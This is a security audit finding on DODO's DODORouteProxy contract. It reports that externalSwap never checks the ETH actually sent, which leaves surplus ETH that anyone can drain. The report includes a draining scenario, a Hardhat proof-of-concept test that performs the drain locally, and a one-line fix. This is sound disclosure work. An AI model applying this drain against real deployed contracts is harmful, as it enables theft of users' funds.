# [H] `externalSwap` function doesnt check if enough eth is sent by the user. Malicious user can withdraw eth stuck in the contract.

## Summary
Severity: High
Reporter: ElKu
Source: https://github.com/sherlock-audit/2022-11-dodo/blob/main/contracts/SmartRoute/DODORouteProxy.sol#L164
Type: audit-issue

## Details
# `externalSwap` function doesnt check if enough eth is sent by the user. Malicious user can withdraw eth stuck in the contract.

## Summary

In [externalSwap](https://github.com/sherlock-audit/2022-11-dodo/blob/main/contracts/SmartRoute/DODORouteProxy.sol#L164) function, the contract doesn't check if the user has sent `eth` equal to or greater than `fromTokenAmount`. This results in extra eth sent by user to be stuck in the contract, and an opportunity for a malicious user to be able to withdraw it.

## Vulnerability Detail

Looking at the implementation of the [externalSwap](https://github.com/sherlock-audit/2022-11-dodo/blob/main/contracts/SmartRoute/DODORouteProxy.sol#L164) function, we can see no checks performed anywhere to see if the `msg.value >= fromTokenAmount`.

Also, when the `swapTarget` contract is called, the eth sent to it, is `fromTokenAmount` instead of `msg.value`.

If the contract has zero eth as balance, then this vulnerability is not an issue. But if it has some eth, it can be withdrawn by anyone.

Lets look at following scenario:
1. `User 1` calls `externalSwap` function  with 2 eth as `msg.value`, but he wants to swap only for 1 eth, which means `fromTokenAmount` = 1 eth. 
2. `User 1` was able to swap successfully, and `DODORouteProxy` contract has a balance of 1 eth now.
3. Next `User 2`, seeing that the contract has a balance of 1 eth, calls the `externalSwap` function  with 0 eth as `msg.value` and `fromTokenAmount` as 1 eth.  
4. Since the contract has a balance of 1 eth, the function call wont revert and `User 2` is able to drain the eth. 


## Impact

1. Users who accidentally sent more eth can loose their extra eth.
2. Any eth present in the protocol can be easily drained by an attacker as the POC shows. 

## Code Snippet
The following POC was written to prove the scenario mentioned above:

```solidity
import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Contract, Signer, BigNumber } from 'ethers';
import chai from 'chai';
import { BigNumber as LocBN} from 'bignumber.js'
import { solidity } from "ethereum-waffle";
import { equal } from 'assert';
chai.use(solidity);

// TODO add approve whitelist test
// TODO add attack data test 
describe('DODORouteProxy', function () {
  let weth: Contract;
  let dodoApprove: Contract;
  let dodoApproveProxy: Contract;
  let dodoRouteProxy: Contract;
  let mockAdapter: Contract;
  let mockAdapter2_w: Contract, mockAdapterw_2: Contract, mockAdapter3_2:Contract;
  let token1: Contract, token2: Contract, token3: Contract;
  let alice: Signer, bob: Signer, proxy1: Signer, broker: Signer;
  let aliceAddr: string, bobAddr: string, proxy1Addr: string, brokerAddr: string;

  const BIG_NUMBER_1E18 = BigNumber.from(10).pow(18)
  const BIG_NUMBER_1E15 = BigNumber.from(10).pow(15)
  const _ETH_ = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"

  beforeEach(async () => {
    [, alice, bob, broker, proxy1] = await ethers.getSigners();
    aliceAddr = await alice.getAddress();
    bobAddr = await bob.getAddress();
    brokerAddr  = await broker.getAddress();
    proxy1Addr = await proxy1.getAddress();

    // pre-work
    const weth9 = await ethers.getContractFactory('WETH9');
    weth = await weth9.connect(alice).deploy();

    
    const DODOApprove = await ethers.getContractFactory('DODOApprove');
    dodoApprove =  await DODOApprove.connect(alice).deploy();

    const DODOApproveProxy = await ethers.getContractFactory('DODOApproveProxy');
    dodoApproveProxy =  await DODOApproveProxy.connect(alice).deploy(dodoApprove.address);
    await dodoApprove.init(aliceAddr, dodoApproveProxy.address);

    
    const DODORouteProxy = await ethers.getContractFactory('DODORouteProxy');
    dodoRouteProxy =  await DODORouteProxy.connect(alice).deploy(weth.address, dodoApproveProxy.address, proxy1Addr);
    await dodoApproveProxy.init(aliceAddr, [dodoRouteProxy.address]);

    
    // set route fee
    await dodoRouteProxy.connect(alice).changeRouteFeeRate("2000000000000000")
    await dodoRouteProxy.connect(alice).changeRouteFeeReceiver(proxy1Addr)
    console.log("ok")
    
    // create tokens
    const ERC20Mock = await ethers.getContractFactory('ERC20Mock');
    token1 = await ERC20Mock.deploy("Token1", "tk1");
    await token1.transfer(aliceAddr, BIG_NUMBER_1E18.mul(100).toString());
    await token1.transfer(bobAddr, BIG_NUMBER_1E18.mul(100).toString());
    expect(await token1.balanceOf(aliceAddr)).eq(BIG_NUMBER_1E18.mul(100));

    token2 = await ERC20Mock.deploy("Token2", "tk2");
    await token2.transfer(aliceAddr, BIG_NUMBER_1E18.mul(100));
    await token2.transfer(bobAddr, BIG_NUMBER_1E18.mul(100));
    expect(await token2.balanceOf(aliceAddr)).eq(BIG_NUMBER_1E18.mul(100));

    token3 = await ERC20Mock.deploy("Token3", "tk3");
    await token3.transfer(aliceAddr, BIG_NUMBER_1E18.mul(100));
    await token3.transfer(bobAddr, BIG_NUMBER_1E18.mul(100));
    expect(await token3.balanceOf(aliceAddr)).eq(BIG_NUMBER_1E18.mul(100));

    console.log("ok2")
    
    //create mock adapter， token1 -token2
    const MockAdapter = await ethers.getContractFactory('MockAdapter');
    await weth.connect(alice).deposit({value: ethers.utils.parseEther("100.0")})
    
    mockAdapter = await MockAdapter.deploy(token1.address, token2.address, BIG_NUMBER_1E18.toString());
    await mockAdapter.deployed();
    await token1.transfer(mockAdapter.address, BIG_NUMBER_1E18.mul(1000).toString());
    await token2.transfer(mockAdapter.address, BIG_NUMBER_1E18.mul(1000).toString());
    await mockAdapter.connect(alice).update();

    mockAdapter2_w = await MockAdapter.deploy(token2.address, weth.address, BIG_NUMBER_1E15.mul(50).toString()); // 0.056
    await mockAdapter2_w.deployed();
    await weth.connect(alice).transfer(mockAdapter2_w.address, BIG_NUMBER_1E18.mul(20).toString());
    await token2.transfer(mockAdapter2_w.address, BIG_NUMBER_1E18.mul(1000).toString());
    await mockAdapter2_w.connect(alice).update();

    mockAdapterw_2 = await MockAdapter.deploy(weth.address, token2.address,BIG_NUMBER_1E18.mul(20).toString()); //20
    await mockAdapterw_2.deployed();
    await weth.connect(alice).transfer(mockAdapterw_2.address, BIG_NUMBER_1E18.mul(20).toString());
    await token2.transfer(mockAdapterw_2.address, BIG_NUMBER_1E18.mul(1000).toString());
    await mockAdapterw_2.connect(alice).update();

    mockAdapter3_2 = await MockAdapter.deploy(token3.address, token2.address, BIG_NUMBER_1E15.mul(100).toString()); //0.1
    await mockAdapter3_2.deployed();
    await token3.transfer(mockAdapter3_2.address, BIG_NUMBER_1E18.mul(1000).toString());
    await token2.transfer(mockAdapter3_2.address, BIG_NUMBER_1E18.mul(1000).toString());
    await mockAdapter3_2.connect(alice).update();

    console.log("ok3")
    // approve
    await token1.connect(alice).approve(dodoApprove.address, BIG_NUMBER_1E18.mul(1000).toString())
    await token2.connect(alice).approve(dodoApprove.address, BIG_NUMBER_1E18.mul(1000).toString())
    await token3.connect(alice).approve(dodoApprove.address, BIG_NUMBER_1E18.mul(1000).toString())
    await token1.connect(bob).approve(dodoApprove.address, BIG_NUMBER_1E18.mul(1000).toString())
    await token2.connect(bob).approve(dodoApprove.address, BIG_NUMBER_1E18.mul(1000).toString())
    await token3.connect(bob).approve(dodoApprove.address, BIG_NUMBER_1E18.mul(1000).toString())
    
  });

  

  

  it('external swap', async () => {
    /// set approve white list and swap white list
    await dodoRouteProxy.connect(alice).addWhiteList(mockAdapter.address);
    await dodoRouteProxy.connect(alice).addApproveWhiteList(mockAdapter.address);

    console.log(brokerAddr, aliceAddr)
    let abiCoder = new ethers.utils.AbiCoder();
    let feeData = await abiCoder.encode(["address", "uint256"], [brokerAddr, "2000000000000000"])

    let ABI = ["function externalSwap(address to, address fromToken, address toToken, uint256 fromAmount)"]
    let itf = new ethers.utils.Interface(ABI)
    let callData = itf.encodeFunctionData("externalSwap", [dodoRouteProxy.address, token1.address, token2.address, BIG_NUMBER_1E18.mul(1).toString()])

    /*
    function externalSwap(
        address fromToken,
        address toToken,
        address approveTarget,
        address swapTarget,
        uint256 fromTokenAmount,
        uint256 minReturnAmount,
        bytes memory feeData,
        bytes memory callDataConcat,
        uint256 deadLine
    */

    //eth-token
    let bal = await ethers.provider.getBalance(dodoRouteProxy.address);
    console.log("dodoRouteProxy balance=", etherToNumber(bal));
    let beforeBob = await token2.balanceOf(bobAddr)
    await dodoRouteProxy.connect(alice).addWhiteList(mockAdapterw_2.address);
    await dodoRouteProxy.connect(alice).addApproveWhiteList(mockAdapterw_2.address);
    let callData2 = itf.encodeFunctionData("externalSwap", [dodoRouteProxy.address, _ETH_, token2.address, BIG_NUMBER_1E18.mul(1).toString()])
    await dodoRouteProxy.connect(bob).externalSwap(
      _ETH_,
      token2.address,
      mockAdapterw_2.address,
      mockAdapterw_2.address,
      BIG_NUMBER_1E18.mul(1).toString(),
      "1",
      feeData,
      callData2,
      "99999999999",

      {value: ethers.utils.parseEther("2.0")}
    )
    let afterBalance = await token2.balanceOf(bobAddr)
    let afterReceiver = await token2.balanceOf(proxy1Addr)
    let afterBroker = await token2.balanceOf(brokerAddr)
    expect(etherToNumber(afterBalance) == 19.92, "externalSwap eth - token failed")
    console.log("externalSwap bob eth-token1:", etherToNumber(afterBalance) - etherToNumber(beforeBob), afterReceiver, afterBroker)
    bal = await ethers.provider.getBalance(dodoRouteProxy.address);
    console.log("post dodoRouteProxy balance=", etherToNumber(bal));

    //elku eth2
    bal = await ethers.provider.getBalance(dodoRouteProxy.address);
    console.log("dodoRouteProxy balance=", etherToNumber(bal));
    beforeBob = await token2.balanceOf(bobAddr)
    await dodoRouteProxy.connect(alice).addWhiteList(mockAdapterw_2.address);
    await dodoRouteProxy.connect(alice).addApproveWhiteList(mockAdapterw_2.address);
    callData2 = itf.encodeFunctionData("externalSwap", [dodoRouteProxy.address, _ETH_, token2.address, BIG_NUMBER_1E18.mul(1).toString()])
    await dodoRouteProxy.connect(bob).externalSwap(
      _ETH_,
      token2.address,
      mockAdapterw_2.address,
      mockAdapterw_2.address,
      BIG_NUMBER_1E18.mul(1).toString(),
      "1",
      feeData,
      callData2,
      "99999999999",

      {value: ethers.utils.parseEther("0.0")}
    )
    afterBalance = await token2.balanceOf(bobAddr)
    afterReceiver = await token2.balanceOf(proxy1Addr)
    afterBroker = await token2.balanceOf(brokerAddr)
    expect(etherToNumber(afterBalance) == 19.92, "externalSwap eth - token failed")
    console.log("externalSwap bob eth-token2:", etherToNumber(afterBalance) - etherToNumber(beforeBob), afterReceiver, afterBroker)
    bal = await ethers.provider.getBalance(dodoRouteProxy.address);
    console.log("post dodoRouteProxy balance=", etherToNumber(bal));  
  }); 

})

export function etherToNumber(utilsN: BigNumber) {
  return Number(ethers.utils.formatEther(utilsN).toString())
}

```

## Tool used

VSCode, Hardhat

## Recommendation

Add require statements in the `externalSwap` function:
```solidity
require(msg.value == fromTokenAmount, "Incorrect eth");
```
